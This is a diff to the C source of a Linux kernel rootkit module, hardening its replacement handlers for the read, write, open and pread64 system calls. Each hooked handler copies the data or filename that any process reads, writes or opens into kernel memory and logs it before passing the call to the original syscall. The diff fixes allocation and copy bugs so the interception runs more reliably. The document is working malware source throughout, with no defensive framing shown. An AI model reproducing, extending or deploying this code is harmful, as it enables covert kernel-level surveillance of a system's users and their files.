@@ -1,12 +1,13 @@
 #include "rootkit-main.h"
 
 #include "hooking.h"
-#include <linux/init.h>
 #include <linux/ioctl.h>
+#include <linux/limits.h>
 #include <linux/linkage.h>
 #include <linux/miscdevice.h>
 #include <linux/mm.h>
 #include <linux/module.h>
+#include <linux/printk.h>
 #include <linux/slab.h>
 #include <linux/types.h>
 #include <linux/uaccess.h>
@@ -68,6 +69,7 @@ asmlinkage long new_read(struct pt_regs *p_regs)
     char __user *s_buf   = (char __user *)p_regs->si; // second parameter
     size_t sz_count      = (size_t)p_regs->dx;        // third parameter
 
+    long l_err;
     long l_ret;
     char *s_data;
 
@@ -77,11 +79,17 @@ asmlinkage long new_read(struct pt_regs *p_regs)
 
     s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);
 
-    if (copy_from_user(s_data, s_buf, sz_count)) {
-        pr_err("[ROOTKIT] * Could not copy data from user");
+    if (s_data == NULL) {
+        pr_err("[ROOTKIT] * Could not allocate memory");
     } else {
-        s_data[sz_count] = '\0';
-        pr_info("[ROOTKIT] * Data read: %s", s_data);
+        l_err = strncpy_from_user(s_data, s_buf, sz_count + 1);
+
+        if (l_err < 0) {
+            pr_err("[ROOTKIT] * Could not copy data from user");
+        } else {
+            pr_info("[ROOTKIT] * Data read: %.*s", (int)sz_count, s_data);
+        }
+
         kvfree(s_data);
     }
 
@@ -94,17 +102,24 @@ asmlinkage long new_write(struct pt_regs *p_regs)
     const char __user *s_buf = (const char __user *)p_regs->si;
     size_t sz_count          = (size_t)p_regs->dx;
 
+    long l_err;
     char *s_data;
 
     pr_info("[ROOTKIT] write(%u, %p, %zu)", ui32_fd, s_buf, sz_count);
 
     s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);
 
-    if (copy_from_user(s_data, s_buf, sz_count)) {
-        pr_err("[ROOTKIT] * Could not copy data from user");
+    if (s_data == NULL) {
+        pr_err("[ROOTKIT] * Could not allocate memory");
     } else {
-        s_data[sz_count] = '\0';
-        pr_info("[ROOTKIT] * Data to write: %s", s_data);
+        l_err = strncpy_from_user(s_data, s_buf, sz_count + 1);
+
+        if (l_err < 0) {
+            pr_err("[ROOTKIT] * Could not copy data from user");
+        } else {
+            pr_info("[ROOTKIT] * Data to write: %.*s", (int)sz_count, s_data);
+        }
+
         kvfree(s_data);
     }
 
@@ -117,7 +132,25 @@ asmlinkage long new_open(struct pt_regs *p_regs)
     int i32_flags                 = (int)p_regs->si;
     umode_t ui16_mode             = (umode_t)p_regs->dx;
 
-    pr_info("[ROOTKIT] open(\"%s\", %#x, 0%ho)", s_filename, i32_flags, ui16_mode);
+    long l_err;
+    char *s_filename_k;
+
+    s_filename_k = (char *)kvmalloc(PATH_MAX, GFP_KERNEL);
+
+    if (s_filename_k == NULL) {
+        pr_err("[ROOTKIT] * Could not allocate memory");
+    } else {
+        l_err = strncpy_from_user(s_filename_k, s_filename, PATH_MAX);
+
+        if (l_err < 0) {
+            pr_err("[ROOTKIT] * Could not copy filename from user");
+            strncpy(s_filename_k, "(unknown)", PATH_MAX);
+        }
+
+        pr_info("[ROOTKIT] open(\"%s\", %#x, 0%ho)", s_filename_k, i32_flags, ui16_mode);
+
+        kvfree(s_filename_k);
+    }
 
     return orig_open(p_regs);
 }
@@ -129,6 +162,7 @@ asmlinkage long new_pread64(struct pt_regs *p_regs)
     size_t sz_count      = (size_t)p_regs->dx;
     loff_t i64_pos       = (loff_t)p_regs->r10;
 
+    long l_err;
     long l_ret;
     char *s_data;
 
@@ -138,11 +172,17 @@ asmlinkage long new_pread64(struct pt_regs *p_regs)
 
     s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);
 
-    if (copy_from_user(s_data, s_buf, sz_count)) {
-        pr_err("[ROOTKIT] * Could not copy data from user");
+    if (s_data == NULL) {
+        pr_err("[ROOTKIT] * Could not allocate memory");
     } else {
-        s_data[sz_count] = '\0';
-        pr_info("[ROOTKIT] * Data read: %s", s_data);
+        l_err = strncpy_from_user(s_data, s_buf, sz_count + 1);
+
+        if (l_err < 0) {
+            pr_err("[ROOTKIT] * Could not copy data from user");
+        } else {
+            pr_info("[ROOTKIT] * Data read: %.*s", (int)sz_count, s_data);
+        }
+
         kvfree(s_data);
     }
 
